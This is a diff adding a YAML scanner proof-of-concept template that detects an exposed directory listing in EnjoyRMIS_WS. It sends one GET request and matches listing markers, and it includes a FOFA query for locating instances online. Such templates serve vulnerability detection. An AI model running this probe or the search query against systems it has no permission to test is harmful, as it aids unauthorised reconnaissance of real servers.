@@ -1,0 +1,16 @@
+id: poc-yaml-enjoyrmis-enjoyrmis-ws-directory-traversal
+info:
+  name: EnjoyRMIS EnjoyRMIS_WS 目录遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: enjoyrmis
+  fofa: body="CheckSilverlightInstalled"
+requests:
+- method: GET
+  path: /EnjoyRMIS_WS/
+  expression: "status_code == 200 && \ncontains(body,\"WS\") &&\ncontains(body,\"\
+    [To Parent Directory]\") &&\ncontains(body,\"&lt;dir&gt;\") &&\ncontains(body,\"\
+    <A HREF=\")\n"
+variables: {}
+transport: http
